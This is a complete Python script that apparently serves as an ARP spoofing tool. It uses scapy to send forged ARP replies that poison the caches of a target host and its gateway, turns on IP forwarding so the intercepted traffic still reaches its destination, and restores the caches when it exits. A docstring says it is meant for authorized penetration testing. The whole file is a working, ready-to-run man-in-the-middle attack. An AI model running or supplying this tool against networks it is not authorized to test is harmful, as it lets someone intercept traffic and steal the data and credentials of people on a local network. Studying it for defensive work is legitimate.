#!/usr/bin/env python3
"""
ARP Spoofer — for use on networks/devices you own or are explicitly
authorized to test.

Continuously poisons the ARP caches of a target and a gateway so traffic
between them flows through this host, and restores both caches cleanly
on exit (Ctrl+C, error, or normal termination).
"""

import argparse
import ipaddress
import platform
import subprocess
import sys
import time
from signal import SIGINT, SIGTERM, signal

from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send, srp
from termcolor import colored


def valid_ip(value: str) -> str:
    try:
        ipaddress.ip_address(value)
    except ValueError:
        raise argparse.ArgumentTypeError(f"'{value}' is not a valid IP address")
    return value


def get_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="ARP spoofing tool for authorized local network penetration testing."
    )
    parser.add_argument(
        "-t",
        "--target",
        required=True,
        type=valid_ip,
        help="Target IP address to spoof (e.g., 192.168.1.50)",
    )
    parser.add_argument(
        "-g",
        "--gateway",
        required=True,
        type=valid_ip,
        help="Gateway/router IP address (e.g., 192.168.1.1)",
    )
    parser.add_argument(
        "-i",
        "--interval",
        type=float,
        default=2.0,
        help="Seconds between spoofed ARP broadcasts (default: 2.0)",
    )
    parser.add_argument(
        "--no-forward",
        action="store_true",
        help="Don't enable IP forwarding automatically (do it yourself if needed)",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Print each spoofed packet, not just a running count",
    )
    return parser.parse_args()


def get_mac(ip_address: str, retries: int = 3, timeout: float = 2.0) -> str | None:
    """Sends ARP requests to resolve a MAC address, retrying a few times."""
    arp_request = ARP(pdst=ip_address)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request

    for attempt in range(1, retries + 1):
        try:
            answered, _ = srp(packet, timeout=timeout, verbose=False)
        except PermissionError:
            print(
                colored(
                    "[-] Error: Root privileges (sudo) required to send raw network frames.",
                    "red",
                )
            )
            sys.exit(1)
        if answered:
            return answered[0][1].hwsrc
        if attempt < retries:
            time.sleep(0.5)
    return None


def spoof(target_ip: str, spoof_ip: str, target_mac: str) -> None:
    """Sends a forged ARP reply telling target_mac that we are spoof_ip."""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def restore(
    destination_ip: str, source_ip: str, destination_mac: str, source_mac: str
) -> None:
    """Sends the correct ARP mapping back so caches heal on exit."""
    packet = ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    send(packet, count=4, verbose=False)


def set_ip_forwarding(enabled: bool) -> None:
    """Enables/disables OS-level IP forwarding so traffic actually reaches
    its real destination instead of just being captured then dropped."""
    value = "1" if enabled else "0"
    system = platform.system()
    try:
        if system == "Linux":
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(value)
        elif system == "Darwin":
            subprocess.run(
                ["sysctl", "-w", f"net.inet.ip.forwarding={value}"],
                check=True,
                capture_output=True,
            )
        else:
            print(
                colored(
                    f"[!] Automatic IP forwarding isn't supported on {system}; "
                    "enable it manually if you need traffic to pass through.",
                    "yellow",
                )
            )
            return
        state = "enabled" if enabled else "disabled"
        print(colored(f"[+] IP forwarding {state}.", "cyan"))
    except (PermissionError, subprocess.CalledProcessError) as exc:
        print(colored(f"[!] Could not set IP forwarding: {exc}", "yellow"))


def main() -> None:
    args = get_arguments()
    target_ip, gateway_ip = args.target, args.gateway

    if target_ip == gateway_ip:
        print(colored("[-] Target and gateway can't be the same IP.", "red"))
        sys.exit(1)

    print(colored("[*] Resolving target and gateway MAC addresses...", "cyan"))
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac:
        print(
            colored(
                f"[-] Critical: Could not find MAC address for target {target_ip}.",
                "red",
            )
        )
        sys.exit(1)
    if not gateway_mac:
        print(
            colored(
                f"[-] Critical: Could not find MAC address for gateway {gateway_ip}.",
                "red",
            )
        )
        sys.exit(1)

    print(colored(f"[+] Target MAC:  {target_mac}", "green"))
    print(colored(f"[+] Gateway MAC: {gateway_mac}", "green"))

    if not args.no_forward:
        set_ip_forwarding(True)

    print(
        colored(
            "\n[*] Starting ARP spoofing loop. Press Ctrl+C to stop and restore the network...",
            "magenta",
        )
    )

    state = {"running": True}

    def cleanup(signum=None, frame=None) -> None:
        if not state["running"]:
            return
        state["running"] = False
        print(colored("\n[!] Restoring ARP caches. Please wait...", "yellow"))
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        if not args.no_forward:
            set_ip_forwarding(False)
        print(colored("[+] Network restored. Exiting.", "green"))
        sys.exit(0)

    signal(SIGINT, cleanup)
    signal(SIGTERM, cleanup)

    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)  # tell target we're the gateway
            spoof(gateway_ip, target_ip, gateway_mac)  # tell gateway we're the target
            sent_packets_count += 2

            if args.verbose:
                print(
                    colored(
                        f"[+] Sent spoofed ARP: {target_ip} <-> {gateway_ip} "
                        f"(total: {sent_packets_count})",
                        "white",
                    )
                )
            else:
                print(
                    f"\r[+] Packets transmitted: {sent_packets_count}",
                    end="",
                    flush=True,
                )

            time.sleep(args.interval)
    except Exception as exc:
        print(colored(f"\n[-] Unexpected runtime error: {exc}", "red"))
        cleanup()


if __name__ == "__main__":
    main()
